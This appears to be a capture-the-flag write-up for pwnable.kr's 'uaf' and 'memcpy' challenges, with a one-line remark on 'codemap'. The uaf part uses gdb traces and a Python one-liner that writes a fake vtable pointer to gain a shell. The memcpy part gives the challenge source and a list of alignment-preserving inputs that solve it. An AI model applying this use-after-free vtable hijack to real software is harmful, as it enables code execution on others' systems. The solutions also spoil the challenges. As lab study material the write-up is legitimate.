   0x0000000000400fe2 <+286>:	call   rdx
   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:	add    rax,0x8
   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
=> 0x0000000000400ff6 <+306>:	mov    rdi,rax
   0x0000000000400ff9 <+309>:	call   rdx
   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>

(gdb) x/x $rbp-0x30
0x7fff7dca55f0:	0x00b65090
(gdb) x/x 0x00b65090
0xb65090:	0x00401550
(gdb) x/x 0x00401550
0x401550 <_ZTV5Woman+16>:	0x0040117a

$ bc
bc 1.06
Copyright 1991-1994, 1997, 1998, 2000 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'.
obase=16
ibase=16
401550-8
401548

python -c 'print "\x48\x15\x40\x00\x00\x00\x00\x00"' > /tmp/des/f.txt

(gdb) r 8 /tmp/des/f.txt
(gdb) x/x $rbp-0x30
0x7fff82c5ef60:	0x01efc090
(gdb) x/x $rbp-0x38
0x7fff82c5ef58:	0x01efc040
(gdb) x/x 0x01efc090
0x1efc090:	0x00401548
(gdb) x/x 0x01efc040
0x1efc040:	0x00000000

Running 1 after sets 0x00000000 :(

(gdb) r 8 /tmp/des/f.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/uaf/uaf 8 /tmp/des/f.txt
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7fff1bdc1000
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1

Breakpoint 3, 0x0000000000400fd8 in main ()
(gdb) x/x $rbp-0x30
0x7fff1bc271e0:	0x023be090
(gdb) x/x $rbp-0x38
0x7fff1bc271d8:	0x023be040
(gdb) x/x 0x023be090
0x23be090:	0x00401548
(gdb) x/x 0x023be040
0x23be040:	0x00401548
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400fdf in main ()
(gdb) c
Continuing.
$ shell :)

Toddler's Bottle - codemap

Havn't got something to debug on windows yet

Toddler's Bottle - memcpy

$ cat memcpy.c
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d : ", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag : ----- erased in this source code -----\n");
	return 0;
}

(gdb) r
Starting program: /home/kgn/memcpy
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16 : 8
specify the memcpy amount between 16 ~ 32 : 16
specify the memcpy amount between 32 ~ 64 : 40
specify the memcpy amount between 64 ~ 128 : 72
specify the memcpy amount between 128 ~ 256 : 136
specify the memcpy amount between 256 ~ 512 : 264
specify the memcpy amount between 512 ~ 1024 : 520
specify the memcpy amount between 1024 ~ 2048 : 1032
specify the memcpy amount between 2048 ~ 4096 : 2056
specify the memcpy amount between 4096 ~ 8192 : 4104
ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy : 1873

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b008
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 15518819947

experiment 2 : memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy : 327

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b018
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 6391489900

experiment 3 : memcpy with buffer size 40
ellapsed CPU cycles for slow_memcpy : 455

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b030
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 5460350553

experiment 4 : memcpy with buffer size 72
ellapsed CPU cycles for slow_memcpy : 552

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b060
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 5546887033

experiment 5 : memcpy with buffer size 136
ellapsed CPU cycles for slow_memcpy : 996

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b0b0
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 4512792234

experiment 6 : memcpy with buffer size 264
ellapsed CPU cycles for slow_memcpy : 1744

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b140
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 6007155954

experiment 7 : memcpy with buffer size 520
ellapsed CPU cycles for slow_memcpy : 4302

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b250
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 9920974952

experiment 8 : memcpy with buffer size 1032
ellapsed CPU cycles for slow_memcpy : 7396

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b460
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 19588126699

experiment 9 : memcpy with buffer size 2056
ellapsed CPU cycles for slow_memcpy : 11279

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804b870
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 31082113748

experiment 10 : memcpy with buffer size 4104
ellapsed CPU cycles for slow_memcpy : 24503

Breakpoint 2, 0x08048ad0 in main ()
(gdb) x/x $ebp-0x28
0xffffd6a0:	0x0804c080
(gdb) c
Continuing.
ellapsed CPU cycles for fast_memcpy : 15770026828

thanks for helping my experiment!
flag : ----- erased in this source code -----
[Inferior 1 (process 6071) exited normally]
(gdb) p 0x0804c080 - 0x0804b870
$13 = 2064
(gdb) p 0x0804b870 - 0x0804b460
$14 = 1040
(gdb) p 0x0804b460 - 0x0804b250
$15 = 528


memcpy@ubuntu:~$ nc 0 9022
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16 : 8
specify the memcpy amount between 16 ~ 32 : 16
specify the memcpy amount between 32 ~ 64 : 40
specify the memcpy amount between 64 ~ 128 : 72
specify the memcpy amount between 128 ~ 256 : 136
specify the memcpy amount between 256 ~ 512 : 264
specify the memcpy amount between 512 ~ 1024 : 520
specify the memcpy amount between 1024 ~ 2048 : 1032
specify the memcpy amount between 2048 ~ 4096 : 2056
specify the memcpy amount between 4096 ~ 8192 : 4104
ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy : 1329
ellapsed CPU cycles for fast_memcpy : 483

experiment 2 : memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy : 351
ellapsed CPU cycles for fast_memcpy : 492

experiment 3 : memcpy with buffer size 40
ellapsed CPU cycles for slow_memcpy : 630
ellapsed CPU cycles for fast_memcpy : 780

experiment 4 : memcpy with buffer size 72
ellapsed CPU cycles for slow_memcpy : 1059
ellapsed CPU cycles for fast_memcpy : 444

experiment 5 : memcpy with buffer size 136
ellapsed CPU cycles for slow_memcpy : 1935
ellapsed CPU cycles for fast_memcpy : 444

experiment 6 : memcpy with buffer size 264
ellapsed CPU cycles for slow_memcpy : 3624
ellapsed CPU cycles for fast_memcpy : 465

experiment 7 : memcpy with buffer size 520
ellapsed CPU cycles for slow_memcpy : 7419
ellapsed CPU cycles for fast_memcpy : 591

experiment 8 : memcpy with buffer size 1032
ellapsed CPU cycles for slow_memcpy : 13896
ellapsed CPU cycles for fast_memcpy : 948

experiment 9 : memcpy with buffer size 2056
ellapsed CPU cycles for slow_memcpy : 27570
ellapsed CPU cycles for fast_memcpy : 1326

experiment 10 : memcpy with buffer size 4104
ellapsed CPU cycles for slow_memcpy : 60393
ellapsed CPU cycles for fast_memcpy : 1917

thanks for helping my experiment!


